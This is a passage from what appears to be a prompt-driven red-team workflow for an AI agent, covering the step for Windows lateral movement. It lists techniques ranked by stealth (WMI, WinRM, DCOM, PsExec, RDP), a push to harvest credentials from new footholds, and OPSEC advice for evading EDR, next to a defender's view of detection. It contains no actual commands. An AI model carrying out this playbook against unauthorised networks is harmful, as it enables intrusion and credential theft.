[A] Advanced Elicitation — Deep analysis of movement results (alternative techniques for failed targets, OPSEC refinement, pivot opportunities from new positions)
[W] War Room — Red (alternative movement chains, technique stacking, access expansion from new positions) vs Blue (detection analysis per technique used, event log correlation, forensic artifact assessment, IOC generation for techniques observed)
[C] Continue — Proceed to Step 5: Linux/Unix Lateral Movement"

#### Menu Handling Logic:

- IF A: Deep analysis of movement results — examine failed movement attempts for root cause (credential mismatch, service unavailable, EDR blocked), explore alternative techniques for unreached targets, assess pivot opportunities from newly accessed systems, investigate whether new credentials or trust relationships are available from new positions. Process insights, ask user if they want to retry failed movements or update plan, if yes iterate and redisplay menu, if no redisplay menu
- IF W: War Room discussion — Red Team perspective: what alternative movement chains exist for failed targets? Can new positions be leveraged to reach previously inaccessible segments? What credential harvesting should be performed on newly accessed systems? What is the current overall network position and coverage? Blue Team perspective: which techniques generated the most detectable artifacts? What SIEM rules should correlate the observed movement patterns? Which event IDs captured the lateral movement? What forensic timeline could be reconstructed? What Sigma rules match? Summarize insights, redisplay menu
- IF C: Update output file frontmatter adding this step name to the end of stepsCompleted array and updating movements_attempted, movements_successful, new_systems_accessed, detection_events, then read fully and follow: ./step-05-linux-lateral.md
- IF user asks questions: Answer and redisplay menu

#### EXECUTION RULES:

- ALWAYS halt and wait for user input after presenting menu
- ONLY proceed to next step when user selects 'C'
- After other menu item execution, return to this menu

## CRITICAL STEP COMPLETION NOTE

ONLY WHEN [C continue option] is selected and [frontmatter properly updated with this step added to stepsCompleted and movements_attempted, movements_successful, new_systems_accessed, detection_events updated and Windows Lateral Movement section populated], will you then read fully and follow: `./step-05-linux-lateral.md` to begin Linux/Unix lateral movement.

---

## SYSTEM SUCCESS/FAILURE METRICS

### ✅ SUCCESS:

- Applicability check performed — Windows targets confirmed or N/A documented
- Movement plan created matching credentials to targets to techniques, prioritized by stealth x probability x value
- All applicable techniques assessed in stealth order: WMI → WinRM → DCOM → Scheduled Task → SMB/PsExec → Named Pipe/Service → RDP
- Operator approval obtained before beginning lateral movement execution
- Every movement attempt logged with: technique, T-code, source→target, credential used, result, artifacts created
- Post-movement validation performed for each successful move (access level, EDR, environment assessment)
- Access Map populated with all successfully accessed systems
- New segments and pivot opportunities documented from new positions
- Report section `## Windows Lateral Movement` populated with full results
- Frontmatter updated: movements_attempted, movements_successful, new_systems_accessed, detection_events
- Step added to stepsCompleted in frontmatter

### ❌ SYSTEM FAILURE:

- Attempting lateral movement without credential→target mapping from step-03
- Starting with high-noise techniques (PsExec, RDP) when lower-noise alternatives (WMI, WinRM) are available
- Not logging failed attempts — failures reveal defensive capabilities and are critical intelligence
- Mass lateral movement to multiple targets simultaneously without OPSEC assessment
- Skipping post-movement validation (access level, EDR check, environment assessment)
- Executing Linux techniques in this step (that is step-05)
- Executing AD-specific attacks (RBCD, delegation, trust exploitation) in this step (that is step-06)
- Not documenting artifacts created on target systems
- Not updating report with results before proceeding
- Proceeding without user selecting 'C' (Continue)
- Using RDP as a first-choice technique when WMI/WinRM are available

**Master Rule:** Skipping steps, optimizing sequences, or not following exact instructions is FORBIDDEN and constitutes SYSTEM FAILURE. Every movement logged, every target validated, every artifact documented. Move deliberately — one target at a time, verify, then proceed.
